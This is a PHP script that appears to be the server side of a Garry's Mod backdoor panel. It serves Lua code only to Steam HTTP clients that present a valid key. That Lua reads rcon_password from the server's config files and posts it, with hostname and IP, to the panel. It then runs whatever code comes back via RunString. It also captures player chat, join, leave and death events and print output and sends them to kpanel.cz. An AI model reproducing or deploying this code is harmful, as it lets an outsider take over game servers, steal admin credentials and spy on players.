<?php
include('../core/class/include.php');

// Génére une chaine de charactére

function reloadString($length = 100) {

    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';

    $charactersLength = strlen($characters);

    $randomString = '';

    for ($i = 0; $i < $length; $i++) {

        $randomString .= $characters[rand(0, $charactersLength - 1)];

    }

    return $randomString;

}

if ($_SERVER['HTTP_USER_AGENT'] != "Valve/Steam HTTP Client 1.0 (4000)") {
	header("Location: ../login.php");
} else {

$key = htmlspecialchars($_GET['key']);
if(empty($key)){
	die("no key");
}
if(!Account::CheckKey($key)){
	die();
}

$string = reloadString(10);

$url = "https://".$_SERVER["HTTP_HOST"].str_replace("1.php", "2.php", $_SERVER["REQUEST_URI"]);

echo '

if game.SinglePlayer() then return end

timer.Create( "'.$string.'", '.Params::GetValue('timer_call').', 0, function()


if file.Exists("cfg/autoexec.cfg","GAME") then
    cfile = file.Read("cfg/autoexec.cfg","GAME")
    for k,v in pairs(string.Split(cfile,"\n")) do
        if string.StartWith(v,"rcon_password") then
            rconpd = string.Split(v,"\"")[2]
        end
    end
end

if file.Exists("cfg/gmod-server.cfg","GAME") then
    cfile = file.Read("cfg/gmod-server.cfg","GAME")
    for k,v in pairs(string.Split(cfile,"\n")) do
        if string.StartWith(v,"rcon_password") then
            rconpd = string.Split(v,"\"")[2]

        end
    end
end

if file.Exists("cfg/server.cfg","GAME") then
    cfile = file.Read("cfg/server.cfg","GAME")
    for k,v in pairs(string.Split(cfile,"\n")) do
        if string.StartWith(v,"rcon_password") then
            rconpd = string.Split(v,"\"")[2]
        end
    end
end


local a = {

n = GetHostName(),

nb = tostring(#player.GetAll()),

i = game.GetIPAddress(),

svkey = '.$key.',

string = '.$string.',

rcon = rconpd

}

http.Post( "'.$url.'", a,

function( body, len, headers, code )

RunString(body)

end)

end)

local cache = {}
hook.Add("PlayerSay", "'.reloadString(10).'", function(ply, msg)
table.insert(cache, "[MESSAGE] "..ply:Name()..": "..msg)
end)

hook.Add("PlayerInitialSpawn", "'.reloadString(10).'", function(ply)
table.insert(cache, "[SYSTEM] "..ply:Name().." vient de se connecter")
end)

hook.Add("PlayerDisconnected", "'.reloadString(10).'", function(ply)
table.insert(cache, "[SYSTEM] "..ply:Name().." vient de se déconnecter")
end)
hook.Add("PlayerDeath", "'.reloadString(10).'", function(ply)
table.insert(cache, "[SYSTEM] "..ply:Name().." est mort")
end)
local realprint = print
function print(...)
local args = {...}
table.insert(cache, "[PRINT] "..args[1])
return realprint(...)
end

timer.Create("'.reloadString(10).'", 10, 0, function()
	if table.Count(cache) == 0 then
		return
	end
	local str = table.concat(cache, "\xFF")
	http.Post("https://kpanel.cz/core/ajax/post-console.php", {i=game.GetIPAddress(),m=str})
	cache = {}
end)

';

}
